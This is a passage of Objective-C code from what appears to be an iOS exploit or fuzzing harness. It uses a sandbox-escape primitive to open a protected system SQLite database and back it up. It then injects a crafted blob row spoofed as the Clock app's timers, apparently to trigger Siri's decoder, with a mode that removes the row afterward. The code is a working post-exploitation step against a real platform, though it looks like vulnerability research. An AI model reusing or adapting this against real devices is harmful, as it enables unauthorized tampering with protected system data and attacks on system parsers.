    const uint64_t F_DEF = 0x0000008000000000ULL;
    const char *variant = getenv("FUZZ_BQ38_VARIANT") ?: "ctrl";
    const char *mode = getenv("FUZZ_BQ38_MODE") ?: "plant";
    BOOL unplant = (strcmp(mode, "unplant") == 0);
    const unsigned char *bytes = NULL;
    NSUInteger len = 0;
    if (strcmp(variant, "m0") == 0)      { bytes = kFz38_M0; len = sizeof(kFz38_M0); }
    else if (strcmp(variant, "m1") == 0) { bytes = kFz38_M1; len = sizeof(kFz38_M1); }
    else if (strcmp(variant, "m2") == 0) { bytes = kFz38_M2; len = sizeof(kFz38_M2); }
    else                                 { bytes = kFz35_C;  len = sizeof(kFz35_C); }
    LOG("[bq38] v179 decoder whitelist probe, VARIANT=%s MODE=%s len=%lu",
        variant, mode, (unsigned long)len);

    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
    LOG("[bq38] CONTROL §170 point -> handle %lld%s", (long long)h,
        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
    fsync(fileno(stderr));
    if (h < 0) { LOG("[bq38] done"); return; }

    NSString *dbp = @"/var/containers/Data/System/"
        "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
    struct stat st = {0};
    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
        LOG("[bq38] CONTROL db stat errno %d — target gone", errno);
        bad_query_release(h); LOG("[bq38] done"); return;
    }

    int ow = unplant ? SQLITE_OPEN_READWRITE : SQLITE_OPEN_READWRITE;
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbp.UTF8String, &db, ow, NULL) != SQLITE_OK) {
        LOG("[bq38] open failed (%s)", db ? sqlite3_errmsg(db) : "?");
        if (db) sqlite3_close(db);
        bad_query_release(h); LOG("[bq38] done"); return;
    }
    int before = bq18_count(db, "SELECT count(*) FROM feedEntries");
    int fzBefore = bq18_count(db, "SELECT count(*) FROM feedEntries "
                                  "WHERE entityId LIKE '%FZ29%'");

    if (unplant) {
        char *err = NULL;
        int rc = sqlite3_exec(db, "DELETE FROM feedEntries "
                              "WHERE entityId LIKE '%FZ29%'", NULL, NULL, &err);
        LOG("[bq38] UNPLANT rc=%d rows %d->%d ourRows %d->%d%s%s", rc, before,
            bq18_count(db, "SELECT count(*) FROM feedEntries"), fzBefore,
            bq18_count(db, "SELECT count(*) FROM feedEntries "
                           "WHERE entityId LIKE '%FZ29%'"),
            err ? ": " : "", err ?: "");
        if (err) sqlite3_free(err);
        fsync(fileno(stderr));
        sqlite3_close(db);
        bad_query_release(h); LOG("[bq38] done"); return;
    }

    // ---- PLANT
    if (fzBefore > 0) {
        LOG("[bq38] CONTROL: ourRows=%d already present — unplant first "
            "(no blind overwrite)", fzBefore);
        sqlite3_close(db);
        bad_query_release(h); LOG("[bq38] done"); return;
    }
    NSString *realBoot = nil;
    sqlite3_stmt *q = NULL;
    if (sqlite3_prepare_v2(db,
            "SELECT bootId FROM feedEntries "
            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
        const char *b = (const char *)sqlite3_column_text(q, 0);
        if (b) realBoot = [NSString stringWithUTF8String:b];
    }
    if (q) sqlite3_finalize(q);
    LOG("[bq38] STATE rows=%d realBootId=%s", before,
        realBoot ? realBoot.UTF8String : "(none)");
    fsync(fileno(stderr));
    if (!realBoot) {
        LOG("[bq38] CONTROL: no real bootId — no blind INSERT");
        sqlite3_close(db);
        bad_query_release(h); LOG("[bq38] done"); return;
    }

    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *bdir = [docs stringByAppendingPathComponent:@"bq38-backup"];
    NSArray *files = @[ dbp,
        [dbp stringByAppendingString:@"-wal"],
        [dbp stringByAppendingString:@"-shm"] ];
    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
        withIntermediateDirectories:YES attributes:nil error:NULL];
    BOOL backupOK = YES;
    for (NSString *f in files) {
        struct stat fs2;
        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
        NSString *dst = [bdir stringByAppendingPathComponent:
            f.lastPathComponent];
        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
    }
    LOG("[bq38] BACKUP %s", backupOK ? "verified" : "BROKEN");
    fsync(fileno(stderr));
    if (!backupOK) {
        LOG("[bq38] no verified backup — refusing to write");
        sqlite3_close(db);
        bad_query_release(h); LOG("[bq38] done"); return;
    }

    NSMutableArray *cols = [NSMutableArray array];
    sqlite3_stmt *ti = NULL;
    if (sqlite3_prepare_v2(db, "PRAGMA table_info(feedEntries)", -1,
                           &ti, NULL) == SQLITE_OK)
        while (sqlite3_step(ti) == SQLITE_ROW)
            [cols addObject:[NSString stringWithUTF8String:
                (const char *)sqlite3_column_text(ti, 1)]];
    if (ti) sqlite3_finalize(ti);
    NSMutableString *colSql = [NSMutableString string], *ph = [NSMutableString string];
    for (NSString *c in cols) {
        [colSql appendFormat:@"%@%@", colSql.length ? @"," : @"", c];
        [ph appendFormat:@"%@?", ph.length ? @"," : @""];
    }
    NSString *insSQLStr = [NSString stringWithFormat:
        @"INSERT INTO feedEntries (%@) VALUES (%@)", colSql, ph];
    NSString *entityId = [NSString stringWithFormat:
        @"TimerEntity/FZ29-%s", variant];
    sqlite3_stmt *ins = NULL;
    int rcIns = -1;
    if (sqlite3_prepare_v2(db, insSQLStr.UTF8String, -1, &ins, NULL)
            != SQLITE_OK) {
        LOG("[bq38] prepare INSERT failed: %s", sqlite3_errmsg(db));
    } else {
        for (int i = 0; i < (int)cols.count; i++) {
            NSString *c = cols[i];
            if ([c isEqualToString:@"lnValue"]) {
                sqlite3_bind_blob(ins, i + 1, bytes, (int)len, SQLITE_TRANSIENT);
            } else {
                NSString *v;
                if ([c isEqualToString:@"feedId"])     v = @"clock.timers";
                else if ([c isEqualToString:@"entityId"])  v = entityId;
                else if ([c isEqualToString:@"bundleId"])  v = @"com.apple.mobiletimer";
                else if ([c isEqualToString:@"bootId"])    v = realBoot;
                else if ([c isEqualToString:@"lastUpdate"]) v = @"2099-01-01T00:00:00.000";
                else v = nil;
                if (v) sqlite3_bind_text(ins, i + 1, v.UTF8String, -1,
                                         SQLITE_TRANSIENT);
                else sqlite3_bind_null(ins, i + 1);
            }
        }
        rcIns = sqlite3_step(ins);
        sqlite3_finalize(ins);
    }
    int fzAfter = bq18_count(db, "SELECT count(*) FROM feedEntries "
                                 "WHERE entityId LIKE '%FZ29%'");
    LOG("[bq38] PLANT rc=%d rows %d->%d ourRows=%d (variant=%s) — "
        "ASK SIRI «сколько таймеров» NOW", rcIns, before,
        bq18_count(db, "SELECT count(*) FROM feedEntries"), fzAfter, variant);
    fsync(fileno(stderr));
    sqlite3_close(db);
    bad_query_release(h);
    LOG("[bq38] done");
}

